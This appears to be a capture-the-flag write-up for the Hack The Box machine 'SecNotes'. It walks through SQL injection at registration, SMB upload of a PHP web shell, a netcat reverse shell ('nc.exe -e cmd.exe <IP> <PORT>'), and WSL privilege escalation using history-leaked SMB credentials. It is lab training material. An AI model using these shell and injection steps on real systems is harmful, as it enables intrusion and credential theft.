---
description: >-
  https://www.hackthebox.eu/home/machines/profile/151https://www.hackthebox.eu/home/machines/profile/123
---

# SecNotes

## Nmap

First I run `nmap -p-` to find all open ports and then run a more intensive scan on the found ports to get the results below:

```
nmap 10.10.10.97 -p 80,445,8808 -A

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Port 80

Lets check out Port 80 first of all. Hitting the root page redirects us to /login.php.

![login.php](<../../../.gitbook/assets/image (149) (1).png>)

Following the link for "Sign up now" takes us to register.php

We are able to create an account which we can then use to login.

![Register.php](<../../../.gitbook/assets/image (150) (1).png>)

Once logged in we have some options

![Login landing page on SecNotes](<../../../.gitbook/assets/image (151) (1).png>)

Immediately we have a username for the user "tyler" as per the top part of the webpage. If we create a new note we can see that the input is not sanitized as I have been able to use the\_ \<h1>\_ tags to apply a header to my note.

![](<../../../.gitbook/assets/image (152) (1) (1).png>)

unfortunately because we will be the only users on this box we wont be able to exploit stored XSS to steal cookies. However, it looks like the site administrator has done a poor job of sanitising user input so we can look to other points of injection in the web application.

I tried the other options and could not find anything of value so we can head back to the login.php page and play around here.

We can see that trying a login with a random account name does inform us on if the account exists.

![login.php](<../../../.gitbook/assets/image (153).png>)

We can try with the "tyler" user we found earlier.

![login.php](<../../../.gitbook/assets/image (154).png>)

I tried common credentials as well and got nothing. Going back to the fact that input does not appear to be sanitized properly we can try creating an account using an injection paramter and see what happens.

## SQL Injection

Create a new account under register.php and use a SQL injection parameter.

![login.php](<../../../.gitbook/assets/image (155) (1) (1).png>)

Once we are logged in in we find we have managed to pull interesting information regarding tyler's account.

![](<../../../.gitbook/assets/image (156) (1).png>)

## SMB

Going back to our `nmap` scan earlier we do have port 445 open for SMB. We can use `smbclient` to check if the credentials found our valid for SMB.

![SMB on port 445](<../../../.gitbook/assets/image (157) (1).png>)

Looks like we have access and have landed on the IIS directory which is running on 8808 as per our `nmap` scan.

Going by the information the next best step would be to test file upload.

![using put to upload on SMB](<../../../.gitbook/assets/image (158) (1) (1).png>)

Looks like we can perform a file upload. To confirm this we can browse to the file in a web browser to confirm this is working as expected.

![File upload confirmation on port 8808](<../../../.gitbook/assets/image (159) (1) (1).png>)

## **Initial Foothold**

So we know that file upload works. Usually from here we can look at uploading a reverse shell. I tried `msfvenom` with ASP and ASPX files but could not get these to work on the server. The files appear to be removed almost instantly. It is possible anti-virus or a scrips cleaning the files out of the directory.

Looking back at our previous results on port 80 we can see the pages are being served as PHP files. Given this information we should start looking into PHP shells instead.

I tried a PHP reverse shell upload and this did not work for me. Instead I looked for a web shell and came across the following from[ joswr1ght.](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)

![Simple php webshell](<../../../.gitbook/assets/image (160) (1).png>)

Save this into a PHP file and upload with SMB. Once uploaded navigate to the directory and you should have a webshell.

![webshell](<../../../.gitbook/assets/image (161) (1).png>)

From here we can upload `netcat` to the server using SMB. Kali has `nc.exe` located in the following directory: `/usr/share/windows-resources/binaries/nc.exe`

Upload this to the server as well. Start a listener on your attacking machine. I chose port 80 in my instance.

```
sudo nc -lvp 80
```

We can use the following command on the webshell to execute `nc.exe`.

```
nc.exe -e cmd.exe <IP> <PORT>
```

Where the `-e`\_ \_switch tells `nc.exe` which program on connection and \<IP> is our attacking IP and \<PORT> our listener port.

We are now connected as a low privilege account:

![nc.exe shell](<../../../.gitbook/assets/image (163) (1).png>)

From here we can grab the user.txt flag.

![Grabbing user.txt](<../../../.gitbook/assets/image (164) (1) (1).png>)

## Privilege Escalation

After moving around the system a little bit we come across the "Distros" directory in c:\\

![](<../../../.gitbook/assets/image (166).png>)

Inside the directory is an executable called `Ubuntu.exe`. After some research it looks like Windows Subsystem for Linux or (WSL) is installed. After some further research on Windows Privilege escalation regarding WSL it seems our next best step is to locate either `bash.exe` or `wsl.exe`. In this write up we will be focusing on `wsl.exe`

Move into the root of c:\ and execute the following command to locate `bash.exe`

```
dir wsl.exe /s
```

![](<../../../.gitbook/assets/image (169).png>)

Now that we have located `wsl.exe` I found the following information regarding WSL allowed me to progress:

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl" %}

![](<../../../.gitbook/assets/image (168) (1).png>)

We can grab a python reverse shell script and run it alongside wsl.exe for a reverse shell. Set up a `netcat` listener and run the python reverse shell appending wsl.exe before the command as per below:

![](<../../../.gitbook/assets/image (170) (1).png>)

Our listener picks up the shell and we have root on the Linux subsystem.

![](<../../../.gitbook/assets/image (171) (1).png>)

This next part took a little bit of digging around but highlighted the importance of upgrading the shell whenever possible. We can find the information to the next part using the `history` command however, this does not work unless you upgrade your shell.

When running the `history` command without an upgraded shell you will get the error `"/bin/sh: 1: history: not found".` Now if you upgrade the shell first for example with a python one as per the following:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

You will then be able to run the history command and retrieve the following information:

![](<../../../.gitbook/assets/image (172).png>)

You can still find the same information if you `cat` .bash\_history file but it is usually quick and easier just to run the `history` command.

From this we have some interesting information regarding SMB. We can take this command change the IP address and proceed with SMB to c$

![SMB](<../../../.gitbook/assets/image (173) (1).png>)

From here we can move into the machine administrator's Desktop and take the root flag.

![](<../../../.gitbook/assets/image (174) (1).png>)
